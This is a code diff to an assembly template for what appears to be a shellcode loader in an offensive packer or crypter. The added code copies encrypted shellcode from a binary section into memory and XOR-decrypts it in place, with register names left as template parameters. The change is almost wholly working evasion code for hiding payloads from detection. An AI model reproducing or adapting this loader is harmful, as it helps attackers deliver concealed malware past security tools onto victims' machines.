@@ -195,13 +195,41 @@ add rsp, 0x08 // restore stack
 
 // read shellcode from section or code cave self
 {{if .SectionMode}}
+  // extract encrypted shellcode from section
+  push rsi
+  push rdi
   mov rsi, {{.RegN.rdi}}
   add rsi, {{hex .SectionOffset}}
-  mov rdi, [rsp]
+  mov rdi, [rsp + 16]
   add rdi, {{hex .EntryOffset}}
-  mov rcx, {{hex .ShellcodeSize}}
-  cld
-  rep movsb
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
+next1:
+  movsb
+  inc rsi
+  dec {{.RegV.rcx}}
+  test {{.RegV.rcx}}, {{.RegV.rcx}}
+  jz break1
+  jmp next1
+break1:
+  pop rdi
+  pop rsi
+
+  // decrypt shellcode in the memory page
+  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}
+  mov {{.RegV.rdx}}, [rsp]
+  add {{.RegV.rdx}}, {{hex .EntryOffset}}
+  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
+next2:
+  mov {{.RegV.r8}}, [{{.RegV.rdx}}]
+  xor {{.RegV.r8}}, {{.RegV.rax}}
+  mov [{{.RegV.rdx}}], {{.RegV.r8}}
+  add {{.RegV.rdx}}, 8
+  sub {{.RegV.rcx}}, 8
+  test {{.RegV.rcx}}, {{.RegV.rcx}}
+  jz break2
+  jmp next2
+break2:
+
 {{else}}
   mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
   mov {{.RegN.rdi}}, [rsp]
